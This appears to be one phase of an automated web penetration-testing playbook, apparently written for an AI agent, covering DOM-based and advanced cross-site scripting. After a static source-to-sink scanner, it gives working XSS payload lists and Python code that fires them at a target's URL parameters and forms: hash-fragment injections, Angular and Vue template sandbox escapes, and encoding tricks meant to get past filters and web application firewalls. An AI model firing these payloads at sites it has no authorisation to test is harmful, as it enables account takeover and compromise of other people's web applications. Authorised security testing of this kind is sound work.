**Phase 5b — DOM-Based XSS & Advanced XSS**

  Run AFTER Phase 5. Tests XSS vectors that Phase 5 cannot catch (DOM sinks, framework injection, encoding bypass).

  **Part A — DOM XSS Source/Sink Analysis (JavaScript scanning):**
  ```python
  import re
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')

  # DOM XSS Sources — where user input enters JS
  DOM_SOURCES = [
      'location.hash', 'location.href', 'location.search', 'location.pathname',
      'document.URL', 'document.documentURI', 'document.referrer',
      'window.name', 'document.cookie', 'postMessage',
      'localStorage.getItem', 'sessionStorage.getItem',
  ]
  # DOM XSS Sinks — where JS writes to dangerous outputs
  DOM_SINKS = [
      'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
      'eval(', 'setTimeout(', 'setInterval(', 'Function(',
      '.insertAdjacentHTML', '.append(', 'jQuery.html(',
      '$(.html(', '.after(', '.before(', '.prepend(',
      'DOMParser', 'createContextualFragment',
  ]

  dom_xss_findings = []
  js_files = list(_G.get('JS_FILES', []))
  # Also grab inline scripts from crawled pages
  all_pages = list(_G.get('AUTH_PAGES', {}).keys()) + list(_G.get('ALL_PAGES', {}).keys())

  print(f"[DOM-XSS] Scanning {len(js_files)} JS files + {len(all_pages)} pages for source→sink chains")

  def scan_js_for_dom_xss(js_content, source_url):
      findings = []
      lines = js_content.split('\n')
      for i, line in enumerate(lines, 1):
          sources_found = [s for s in DOM_SOURCES if s in line]
          sinks_found = [s for s in DOM_SINKS if s in line]
          if sources_found and sinks_found:
              findings.append({
                  'line': i, 'sources': sources_found, 'sinks': sinks_found,
                  'code': line.strip()[:200], 'file': source_url,
              })
          elif sinks_found:
              # Check surrounding lines for sources (within 5 lines)
              context = '\n'.join(lines[max(0,i-6):i+5])
              nearby_sources = [s for s in DOM_SOURCES if s in context]
              if nearby_sources:
                  findings.append({
                      'line': i, 'sources': nearby_sources, 'sinks': sinks_found,
                      'code': line.strip()[:200], 'file': source_url,
                  })
      return findings

  # Scan external JS files
  for js_url in js_files[:30]:
      try:
          r = session.get(js_url, timeout=10)
          if r.status_code == 200 and len(r.text) > 50:
              results = scan_js_for_dom_xss(r.text, js_url)
              dom_xss_findings.extend(results)
      except Exception:
          continue

  # Scan inline scripts in pages
  from bs4 import BeautifulSoup
  for page_url in all_pages[:20]:
      try:
          r = session.get(page_url, timeout=10)
          soup = BeautifulSoup(r.text, 'html.parser')
          for script in soup.find_all('script'):
              if script.string and len(script.string) > 30:
                  results = scan_js_for_dom_xss(script.string, page_url)
                  dom_xss_findings.extend(results)
      except Exception:
          continue

  if dom_xss_findings:
      print(f"\n[HIGH] {len(dom_xss_findings)} potential DOM XSS source→sink chains found:")
      for f in dom_xss_findings[:15]:
          print(f"  File: {f['file']}  Line: {f['line']}")
          print(f"  Sources: {f['sources']}  Sinks: {f['sinks']}")
          print(f"  Code: {f['code']}")
  else:
      print("[INFO] No DOM XSS source→sink chains found in JS")
  ```

  **Part B — DOM XSS Active Testing via Hash Fragment:**
  ```python
  import time

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')

  # Hash-based DOM XSS payloads — these bypass server-side filters entirely
  HASH_PAYLOADS = [
      '#<img src=x onerror=alert(1)>',
      '#"><img src=x onerror=alert(1)>',
      '#javascript:alert(1)',
      '#{{constructor.constructor("alert(1)")()}}',
  ]

  # Test pages that use location.hash (found in Part A or common SPA routes)
  test_pages = [BASE, BASE + '/#/', BASE + '/#/search']
  for page_url in list(_G.get('AUTH_PAGES', {}).keys())[:10]:
      test_pages.append(page_url)

  print(f"[DOM-XSS] Testing {len(test_pages)} pages with hash fragment payloads")
  print("  NOTE: Hash fragments are NOT sent to the server — they only trigger in the browser.")
  print("  Use browser_action to verify any findings visually.")

  for page in test_pages:
      for payload in HASH_PAYLOADS:
          test_url = page.split('#')[0] + payload
          print(f"  Test: {test_url[:100]}")
          # Note: we can't detect DOM XSS via requests alone — need browser
          # Flag for browser verification
          _G.setdefault('DOM_XSS_TESTS', []).append(test_url)

  print(f"\n[INFO] {len(_G.get('DOM_XSS_TESTS', []))} URLs queued for browser-based DOM XSS verification")
  print("  Use browser_action(action='navigate', url=<test_url>) to verify each one")
  print("  Look for alert dialogs or injected content in the screenshot")
  ```

  **Part C — Angular/Vue/React Template Injection:**
  ```python
  import time

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
  ALL_FORMS = _G.get('ALL_FORMS', []) + _G.get('AUTH_FORMS', [])

  # Framework-specific template injection payloads
  FRAMEWORK_XSS = [
      # Angular (all versions)
      ('{{constructor.constructor("alert(1)")()}}', 'Angular sandbox escape'),
      ('{{$on.constructor("alert(1)")()}}', 'Angular $on escape'),
      ('{{"a]".constructor.prototype.charAt=[].join;$eval("x]alert(1)//")}}', 'Angular v1.0-1.1'),
      ('{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}', 'Angular advanced'),
      # Vue.js
      ('{{_c.constructor("alert(1)")()}}', 'Vue template injection'),
      # Generic
      ('${alert(1)}', 'Template literal injection'),
      ('#{alert(1)}', 'Ruby/CoffeeScript interpolation'),
  ]

  # Detect which framework is in use
  try:
      r = session.get(BASE, timeout=10)
      body = r.text.lower()
      framework = 'unknown'
      if 'ng-app' in body or 'ng-controller' in body or 'angular' in body:
          framework = 'angular'
      elif 'vue' in body or 'v-bind' in body or 'v-model' in body:
          framework = 'vue'
      elif 'react' in body or '__NEXT_DATA__' in body or 'data-reactroot' in body:
          framework = 'react'
      print(f"[XSS] Detected frontend framework: {framework}")
  except Exception:
      framework = 'unknown'

  if framework in ('angular', 'vue', 'unknown'):
      print(f"[XSS] Testing {len(FRAMEWORK_XSS)} framework template injection payloads")

      template_findings = []
      for param_info in AUTH_PARAMS[:20]:
          purl = param_info['url'].split('?')[0]
          pname = param_info['param']
          for payload, desc in FRAMEWORK_XSS:
              time.sleep(0.3)
              try:
                  r = session.get(purl, params={pname: payload}, timeout=10)
                  # Check if payload was reflected without encoding
                  if payload in r.text:
                      print(f"[HIGH] Framework XSS ({desc}): {purl} ?{pname}=")
                      print(f"  Payload reflected: {payload}")
                      template_findings.append({
                          'type': 'framework-xss', 'url': purl, 'param': pname,
                          'payload': payload, 'desc': desc,
                      })
                      break
              except Exception:
                  continue

      # Also test forms
      for form in ALL_FORMS[:15]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          fields = form.get('fields', [])
          text_fields = [f for f in fields if f.get('type','text') not in ('submit','hidden','file','checkbox','radio','button')]
          for field in text_fields[:3]:
              for payload, desc in FRAMEWORK_XSS[:3]:
                  time.sleep(0.3)
                  data = {f['name']: f.get('value','') or 'test' for f in fields}
                  data[field['name']] = payload
                  try:
                      method = form.get('method','get').lower()
                      if method == 'post':
                          r = session.post(url, data=data, timeout=10, allow_redirects=True)
                      else:
                          r = session.get(url, params=data, timeout=10)
                      if payload in r.text:
                          print(f"[HIGH] Framework XSS ({desc}): {url} field={field['name']}")
                          template_findings.append({
                              'type': 'framework-xss', 'url': url, 'param': field['name'],
                              'payload': payload, 'desc': desc,
                          })
                          break
                  except Exception:
                      continue

      if template_findings:
          _G.setdefault('XSS_FINDINGS', []).extend([
              {'type': f['type'], 'url': f['url'], 'param': f['param'],
               'payload': f['payload'], 'severity': 'HIGH'} for f in template_findings
          ])
          print(f"\n[HIGH] {len(template_findings)} framework template injection(s) found")
      else:
          print("[INFO] No framework template injection found")
  else:
      print(f"[INFO] React detected — template injection unlikely (JSX is compiled)")
  ```

  **Part D — Encoding Bypass XSS:**
  ```python
  import time
  from urllib.parse import urljoin, quote

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])

  # Encoding bypass payloads — for WAFs and filters
  ENCODING_XSS = [
      # Double URL encoding
      ('%253Cscript%253Ealert(1)%253C%252Fscript%253E', 'double URL encode'),
      # HTML entity encoding
      ('&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', 'HTML hex entities'),
      ('&#60;script&#62;alert(1)&#60;/script&#62;', 'HTML decimal entities'),
      # Unicode
      ('\u003cscript\u003ealert(1)\u003c/script\u003e', 'Unicode escape'),
      # Mixed case + null bytes
      ('<scr%00ipt>alert(1)</scr%00ipt>', 'null byte injection'),
      # SVG + data URI
      ('<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>', 'SVG use href'),
      # Markdown (if app renders markdown)
      ('[xss](javascript:alert(1))', 'Markdown link XSS'),
      ('![xss](x" onerror="alert(1))', 'Markdown image XSS'),
      # JSON injection (for APIs that reflect JSON)
      ('{"key":"</script><script>alert(1)</script>"}', 'JSON breakout'),
  ]

  encoding_findings = []
  # Test on first 10 reflected params found earlier
  test_params = [p for p in AUTH_PARAMS if p.get('param')][:10]

  print(f"[XSS] Testing {len(ENCODING_XSS)} encoding bypass payloads on {len(test_params)} params")

  for param_info in test_params:
      purl = param_info['url'].split('?')[0]
      pname = param_info['param']
      for payload, desc in ENCODING_XSS:
          time.sleep(0.3)
          try:
              r = session.get(purl, params={pname: payload}, timeout=10)
              # Check for unencoded dangerous tags in response
              dangerous = ['<script>', 'onerror=', 'onload=', 'javascript:', 'alert(1)']
              for d in dangerous:
                  if d in r.text and d in payload:
                      print(f"[HIGH] Encoding bypass XSS ({desc}): {purl} ?{pname}=")
                      print(f"  Payload: {payload[:80]}")
                      encoding_findings.append({
                          'type': 'encoding-bypass', 'url': purl, 'param': pname,
                          'payload': payload, 'desc': desc,
                      })
                      break
          except Exception:
              continue
      if encoding_findings and encoding_findings[-1].get('param') == pname:
          continue  # Already found one for this param

  if encoding_findings:
      _G.setdefault('XSS_FINDINGS', []).extend([
          {'type': f['type'], 'url': f['url'], 'param': f['param'],
           'payload': f['payload'], 'severity': 'HIGH'} for f in encoding_findings
      ])
      print(f"\n[HIGH] {len(encoding_findings)} encoding bypass XSS found")
  else:
      print("[INFO] No encoding bypass XSS found")
  ```
